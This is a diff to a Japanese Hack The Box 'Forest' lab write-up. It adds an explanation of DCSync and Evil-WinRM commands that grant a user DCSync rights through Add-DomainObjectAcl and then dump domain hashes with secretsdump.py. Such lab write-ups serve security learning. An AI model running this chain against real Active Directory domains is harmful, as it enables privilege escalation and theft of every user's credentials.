@@ -106,13 +106,25 @@ nt authority\system
 ```
 
 
-## DCSync攻撃について
+DCSync攻撃とは？...**自分がドメインコントローラになりすますことでドメイン内のユーザハッシュが上記のように取れる。**
 
-**自分がドメインコントローラになりすますことでドメイン内のユーザハッシュが上記のように取れる。**
+## 何度やってもできなかったら...
 
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> $pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco> $cred = New-Object System.Management.Automation.PSCredential('htb\harmj0y',$pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity harmj0y -Rights DCSync
+```
 
+と設定してから
 
+```
+┌──(kali㉿kali)-[~]                                                                                                                                                  └─$ secretsdump.py 'htb.local/harmj0y:Passw0rd!@10.10.10.161'
+```
 
+を実行するとうまくいくかも（ここ：https://ranakhalil101.medium.com/hack-the-box-forest-writeup-w-o-metasploit-63070c9020e4 ではそうしてた。）
+
+あと、Noriaki Hayashiさんのwriteupではntlm relayをやってた。
 
 
 
